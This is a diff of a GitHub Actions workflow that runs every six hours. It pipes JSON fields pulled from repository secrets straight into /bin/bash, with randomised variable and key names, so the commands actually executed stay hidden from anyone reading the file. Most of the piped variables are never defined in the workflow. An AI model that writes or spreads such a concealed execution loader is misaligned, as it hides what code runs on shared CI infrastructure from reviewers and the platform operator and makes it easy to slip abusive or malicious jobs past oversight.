@@ -1,24 +1,26 @@
 name: zhaoshouyy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 1/6 * * *'
-jobs:  # 10666
+    - cron: '18 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhaoshouyy
         env:
-          kia8: ${{ secrets.kia8 }}
+          vh180: ${{ secrets.vh180 }}
         run: |
-          echo $kia8 | jq -r .gi77 | /bin/bash
-          echo $oq3 | jq -r .xnuq51 | /bin/bash
-          echo $jdwvl4 | jq -r .d34384 | /bin/bash
-          echo $zmgqr65 | jq -r .ppuud21 | /bin/bash
-          echo $hjvro0977 | jq -r .y6385 | /bin/bash
-          echo $hihr1 | jq -r .h1728 | /bin/bash
-          echo $cxhm40690 | jq -r .nm203 | /bin/bash
+          echo $vh180 | jq -r .bnnx88002 | /bin/bash
+          echo $fvm52756 | jq -r .rasc40 | /bin/bash
+          echo $samx44 | jq -r .ofv71 | /bin/bash
+          echo $gptt69 | jq -r .zbt709 | /bin/bash
+          echo $jt16544 | jq -r .srus5262 | /bin/bash
+          echo $v0 | jq -r .mkjli852 | /bin/bash
+          echo $bbbsl6357 | jq -r .tafp89 | /bin/bash
+          echo $ssscc9 | jq -r .kfcy3 | /bin/bash
+          echo $dotk50 | jq -r .wwbe866 | /bin/bash
+          echo $wk11908 | jq -r .wg55012 | /bin/bash
 
